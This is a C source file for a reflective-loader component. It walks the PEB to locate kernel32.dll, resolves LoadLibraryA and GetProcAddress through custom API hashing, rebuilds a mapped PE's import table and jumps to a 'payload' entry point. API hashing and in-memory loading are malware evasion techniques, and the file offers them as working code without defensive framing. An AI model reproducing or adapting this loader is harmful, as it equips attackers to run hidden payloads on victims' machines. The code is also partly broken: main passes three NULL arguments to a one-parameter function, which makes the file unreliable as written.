#include <stdio.h>
#include "Common.h"

// Get size of an ASCII string
SIZE_T GetSizeOfStringA(LPSTR string) {

	SIZE_T totalSize = 0;

	for (SIZE_T i = 0; string[i] != '\0'; i++) {
		totalSize++;
	}

	return totalSize;
}

// Get size of an Wide string
SIZE_T GetSizeOfStringW(LPWSTR string) {

	SIZE_T totalSize = 0;

	for (SIZE_T i = 0; string[i] != '\0'; i++) {
		totalSize++;
	}

	return totalSize;
}

// Perform API hashing on ASCII string
DWORD GetHashFromStringA(LPSTR string) {

	SIZE_T stringSize = GetSizeOfStringA(string);
	DWORD hash = 0x35;

	for (SIZE_T i = 0; i < stringSize; i++) {
		hash += (hash * 0xab10f29e + string[i]) & 0xffffff;
	}

	return hash;
}

// Perform API hashing on Wide string
DWORD GetHashFromStringW(LPWSTR string) {
	SIZE_T stringSize = GetSizeOfStringW(string);
	DWORD hash = 0x35;

	for (SIZE_T i = 0; i < stringSize; i++) {
		hash += (hash * 0xab10f29e + string[i]) & 0xffffff;
	}

	return hash;
}


__declspec(dllexport) void PositionIndependentIATResolver(const ULONG_PTR mappedPEFile) {


	/*
		Step 1: Find Kernel32.dll and resolve LoadLibraryA, GetProcAddress
	*/

	// Through PEB find the base address of Kernel32.dll

	_PPEB pPEB = (_PPEB)__readgsqword(0x60);
	PLDR_DATA_TABLE_ENTRY pCurrentPLDRDataTableEntry = (PLDR_DATA_TABLE_ENTRY)pPEB->pLdr->InMemoryOrderModuleList.Flink;
	PIMAGE_DOS_HEADER pKernel32Module = NULL;

	do {
		PWSTR currentModuleString = pCurrentPLDRDataTableEntry->BaseDllName.pBuffer;
		if (GetHashFromStringW(currentModuleString) == KERNEL32DLL_HASH) {
			pKernel32Module = (PIMAGE_DOS_HEADER)pCurrentPLDRDataTableEntry->DllBase;
			break;
		}

		pCurrentPLDRDataTableEntry = (PLDR_DATA_TABLE_ENTRY)pCurrentPLDRDataTableEntry->InMemoryOrderModuleList.Flink;

	} while (pCurrentPLDRDataTableEntry->TimeDateStamp != 0);

	if (pKernel32Module == NULL) {
		return;
	}

	// Resolve LoadLibraryA and GetProcAddress (Adding here so compiler does not redirect to another function
	LOADLIBRARYA pLoadLibraryAAddress = NULL;
	GETPROCADDRESS pGetProcAddressAddress = NULL;

	PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(pKernel32Module->e_lfanew + (LPBYTE)pKernel32Module);
	PIMAGE_OPTIONAL_HEADER64 optionalHeader = (PIMAGE_OPTIONAL_HEADER64)& ntHeaders->OptionalHeader;
	DWORD imageExportDirectoryRVA = optionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

	PIMAGE_EXPORT_DIRECTORY kernel32ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(imageExportDirectoryRVA + (LPBYTE)pKernel32Module);
	PDWORD addressOfNames = (PDWORD)(kernel32ExportDirectory->AddressOfNames + (LPBYTE)pKernel32Module);
	PWORD ordinalTable = (PWORD)(kernel32ExportDirectory->AddressOfNameOrdinals + (LPBYTE)pKernel32Module);
	PDWORD addressOfFunctions = (PDWORD)(kernel32ExportDirectory->AddressOfFunctions + (LPBYTE)pKernel32Module);

	for (DWORD i = 0; i < kernel32ExportDirectory->NumberOfNames; i++) {
		LPSTR currentFunctionName = (LPSTR)(addressOfNames[i] + (LPBYTE)pKernel32Module);

		if (GetHashFromStringA(currentFunctionName) == GETPROCADDRESS_HASH) {
			pGetProcAddressAddress = (GETPROCADDRESS)(addressOfFunctions[ordinalTable[i]] + (LPBYTE)pKernel32Module);
		}

		if (GetHashFromStringA(currentFunctionName) == LOADLIBRARYA_HASH) {
			pLoadLibraryAAddress = (LOADLIBRARYA)(addressOfFunctions[ordinalTable[i]] + (LPBYTE)pKernel32Module);
		}

		// If both are resolved we can exit the loop
		if (pLoadLibraryAAddress != NULL && pGetProcAddressAddress != NULL) {
			break;
		}

	}

	if (pLoadLibraryAAddress == NULL || pGetProcAddressAddress == NULL) {
		return;
	}

	/*
	Step 2: Resolve the IAT
	*/

	PIMAGE_NT_HEADERS64 pMappedCurrentDLLNTHeader = (PIMAGE_NT_HEADERS64)(((PIMAGE_DOS_HEADER)mappedPEFile)->e_lfanew + (LPBYTE)mappedPEFile);
	PIMAGE_IMPORT_DESCRIPTOR pMappedCurrentDLLImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(pMappedCurrentDLLNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + (LPBYTE)mappedPEFile);

	while (pMappedCurrentDLLImportDescriptor->Name != NULL) {
		LPSTR currentDLLName = (LPSTR)(pMappedCurrentDLLImportDescriptor->Name + (LPBYTE)mappedPEFile);
		HMODULE hCurrentDLLModule = pLoadLibraryAAddress(currentDLLName);

		PIMAGE_THUNK_DATA64 pImageThunkData = (PIMAGE_THUNK_DATA64)(pMappedCurrentDLLImportDescriptor->FirstThunk + (LPBYTE)mappedPEFile);

		while (pImageThunkData->u1.AddressOfData) {

			if (pImageThunkData->u1.Ordinal & 0x8000000000000000) {
				// Import is by ordinal
			
				FARPROC resolvedImportAddress = pGetProcAddressAddress(hCurrentDLLModule, MAKEINTRESOURCEA(pImageThunkData->u1.Ordinal));

				if (resolvedImportAddress == NULL) {
					return;
				}

				// Overwrite entry in IAT with the address of resolved function
				pImageThunkData->u1.AddressOfData = (ULONGLONG)resolvedImportAddress;

			}
			else {
				// Import is by name
				PIMAGE_IMPORT_BY_NAME pAddressOfImportData = (PIMAGE_IMPORT_BY_NAME)((pImageThunkData->u1.AddressOfData) + (LPBYTE)mappedPEFile);
				FARPROC resolvedImportAddress = pGetProcAddressAddress(hCurrentDLLModule, pAddressOfImportData->Name);

				if (resolvedImportAddress == NULL) {
					return;
				}

				// Overwrite entry in IAT with the address of resolved function
				pImageThunkData->u1.AddressOfData = (ULONGLONG)resolvedImportAddress;

			}

			pImageThunkData++;
		}

		pMappedCurrentDLLImportDescriptor++;
	}

	/*
	Step 3: Jump to the entrypoint of the payload
	*/

	void (*pEntryPoint)(void) = (void (*)()) (pMappedCurrentDLLNTHeader->OptionalHeader.AddressOfEntryPoint + (LPBYTE)mappedPEFile);
	pEntryPoint();
}

int main()
{
	PositionIndependentIATResolver(NULL, NULL, NULL);
}